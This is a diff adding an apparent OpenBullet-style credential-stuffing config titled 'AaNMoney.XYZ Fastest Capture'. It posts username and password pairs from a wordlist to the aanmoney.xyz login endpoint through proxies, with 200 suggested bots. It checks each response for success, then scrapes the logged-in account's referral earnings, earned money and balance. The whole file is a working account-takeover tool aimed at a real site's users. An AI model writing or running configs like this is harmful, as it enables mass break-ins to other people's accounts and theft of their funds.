@@ -1,0 +1,75 @@
+[SETTINGS]
+{
+  "Name": "AaNMoney.XYZ Fastest Capture ",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-24T00:34:42.9959559+03:00",
+  "AdditionalInfo": "beleş para xd",
+  "Author": "<S.P.A.C.E.&.L.O.L.I>",
+  "Version": "1.3.8 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://aanmoney.xyz/dologin.php?rstr=0.11437045330486129" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Success OR 
+    KEY "ok" 
+
+REQUEST GET "https://aanmoney.xyz/userarea.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<td><h2><div id=\"refmoney\">" "</div>" -> CAP "Referalden Kazanılanlar" 
+
+PARSE "<SOURCE>" LR "<td><h2><div id=\"moneycount\">" "&nbsp</div></h2></td>" -> CAP "Kazanılan" 
+
+PARSE "<SOURCE>" LR " <h2>Account balance <span>" "</span>" -> CAP "Hesap Bakiyesi" "" " $" 
+
